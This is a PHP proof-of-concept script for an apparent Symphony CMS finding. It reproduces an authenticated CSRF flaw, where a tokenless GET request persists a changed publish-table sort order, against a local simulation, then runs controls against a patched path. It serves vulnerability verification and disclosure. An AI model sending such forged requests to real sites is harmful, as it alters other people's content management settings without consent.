<?php
require __DIR__ . '/vulnerable_app/symphony_publish_sorting_sim.php';

function out(string $label, $value = null): void
{
    echo $label . "\n";
    if ($value !== null) {
        echo json_encode($value, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) . "\n";
    }
}

out('[*] PoC context:', [
    'finding' => 'symphonycms/symphonycms CAND-3ce301b5e576',
    'vulnerability' => 'Authenticated CSRF / unsafe GET state-changing action',
    'root_cause' => [
        'symphony/lib/toolkit/class.xsrf.php validates XSRF only when $_POST is non-empty',
        'symphony/content/class.sortable.php reads sort/order from $_REQUEST',
        'symphony/content/content.publish.php persists changed sorting config via Section::setSortingField()/setSortingOrder()',
    ],
    'safety' => 'This PoC is a local-only simulation. It never connects to a real Symphony CMS instance.',
]);

local_reset_symphony_state();
out('\n[*] Initial sorting state:', local_get_sorting_state());

out('\n[*] Attack 1: forged GET without xsrf changes the persisted publish-table sort order.');
$attack = local_simulate_symphony_request('GET', ['sort' => 'title', 'order' => 'asc']);
out('[*] Vulnerable GET result:', $attack);

$changed = $attack['http_status'] === 302
    && $attack['csrf_checks'] === 0
    && $attack['after']['sortby'] === 'title'
    && $attack['after']['order'] === 'asc'
    && $attack['after']['writes'] > $attack['before']['writes'];

if (!$changed) {
    fwrite(STDERR, "[FAIL] Expected tokenless GET to persist the sorting configuration.\n");
    exit(1);
}
out('[PASS] Vulnerability reproduced: GET skipped XSRF validation and persisted sortby=title/order=asc.');

local_reset_symphony_state();
out('\n[*] Control 1: POST without xsrf is rejected by the existing global XSRF gate.');
$postNoToken = local_simulate_symphony_request('POST', [], ['sort' => 'title', 'order' => 'asc']);
out('[*] Vulnerable POST without token result:', $postNoToken);

if ($postNoToken['http_status'] !== 403 || $postNoToken['csrf_checks'] !== 1 || $postNoToken['after']['sortby'] !== 'id') {
    fwrite(STDERR, "[FAIL] Expected POST without xsrf to be rejected.\n");
    exit(1);
}
out('[PASS] Control passed: POST requests are XSRF-checked; the bug is the GET + $_REQUEST state change.');

local_reset_symphony_state();
out('\n[*] Control 2: same forged GET against patched path.');
$patchedGet = local_simulate_symphony_request('GET', ['sort' => 'title', 'order' => 'asc'], [], true);
out('[*] Patched GET result:', $patchedGet);

if ($patchedGet['http_status'] !== 405 || $patchedGet['after']['sortby'] !== 'id' || $patchedGet['after']['writes'] !== 0) {
    fwrite(STDERR, "[FAIL] Expected patched GET to be rejected before configuration write.\n");
    exit(1);
}
out('[PASS] Patched control passed: GET sort persistence is rejected before any state change.');

local_reset_symphony_state();
out('\n[*] Control 3: legitimate POST with valid xsrf against patched path.');
$patchedPost = local_simulate_symphony_request('POST', [], [
    'sort' => 'title',
    'order' => 'asc',
    'xsrf' => LocalXSRF::TOKEN,
], true);
out('[*] Patched POST with token result:', $patchedPost);

if ($patchedPost['http_status'] !== 302 || $patchedPost['csrf_checks'] !== 1 || $patchedPost['csrf_failures'] !== 0 || $patchedPost['after']['sortby'] !== 'title') {
    fwrite(STDERR, "[FAIL] Expected patched POST with valid token to perform intended sort update.\n");
    exit(1);
}
out('[PASS] Patched positive control passed: POST plus valid XSRF token still permits intended sorting update.');

echo "\nVULNERABLE: Symphony CMS CAND-3ce301b5e576 reproduced successfully.\n";
